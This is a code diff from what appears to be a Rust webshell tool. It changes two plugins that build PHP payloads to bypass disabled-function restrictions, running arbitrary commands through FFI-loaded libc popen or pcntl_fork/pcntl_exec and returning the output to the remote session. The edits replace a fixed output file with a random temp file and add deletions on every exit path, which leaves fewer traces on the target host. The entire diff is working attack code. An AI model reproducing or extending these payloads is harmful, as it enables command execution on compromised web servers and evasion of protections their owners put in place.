@@ -226,7 +226,7 @@ impl FeaturePlugin for BypassFfiPlugin {
             r#"<?php
 error_reporting(0);
 $cmd = {cmd};
-$of = "{out}";
+$of = tempnam(sys_get_temp_dir(), 'dsw_ffi_');
 $lib = null;
 $ffi = null;
 foreach (array('libc.so.6', 'libc.so', '/lib/x86_64-linux-gnu/libc.so.6', '/usr/lib/libc.dylib', 'msvcrt.dll') as $l) {{
@@ -234,6 +234,7 @@ foreach (array('libc.so.6', 'libc.so', '/lib/x86_64-linux-gnu/libc.so.6', '/usr/
     catch (Throwable $e) {{ continue; }}
 }}
 if ($lib === null) {{
+    @unlink($of);
     echo json_encode(array('ok' => false, 'error' => 'FFI 不可用或无法加载 libc（需 PHP 7.4+ 且 ffi.enable=1）'));
     return;
 }}
@@ -244,6 +245,7 @@ try {{
         $buf = $ffi->new("char[4096]");
         while ($ffi->fgets($buf, 4095, $fp) !== null) {{ $output .= FFI::string($buf); }}
         $ffi->pclose($fp);
+        @unlink($of);
         echo json_encode(array('ok' => true, 'lib' => $lib, 'method' => 'popen',
             'output' => base64_encode($output), 'output_text' => $output));
     }} else {{
@@ -254,11 +256,11 @@ try {{
             'output' => base64_encode($output), 'output_text' => $output));
     }}
 }} catch (Throwable $e) {{
+    @unlink($of);
     echo json_encode(array('ok' => false, 'error' => $e->getMessage()));
 }}
 "#,
             cmd = crate::feature_plugins::php_json_str(&cmd),
-            out = BYPASS_OUT,
         );
         run_payload(protocol, session, &code, settings)
     }
@@ -300,7 +302,7 @@ impl FeaturePlugin for BypassPcntlPlugin {
             r#"<?php
 error_reporting(0);
 $cmd = {cmd};
-$of = "{out}";
+$of = tempnam(sys_get_temp_dir(), 'dsw_pcntl_');
 $ok = false;
 if (function_exists('pcntl_fork') && function_exists('pcntl_exec') && function_exists('pcntl_waitpid')) {{
     $pid = pcntl_fork();
@@ -318,10 +320,10 @@ if (function_exists('pcntl_fork') && function_exists('pcntl_exec') && function_e
         return;
     }}
 }}
+@unlink($of);
 echo json_encode(array('ok' => false, 'error' => 'pcntl_exec/pcntl_fork/pcntl_waitpid 不可用'));
 "#,
             cmd = crate::feature_plugins::php_json_str(&cmd),
-            out = BYPASS_OUT,
         );
         run_payload(protocol, session, &code, settings)
     }
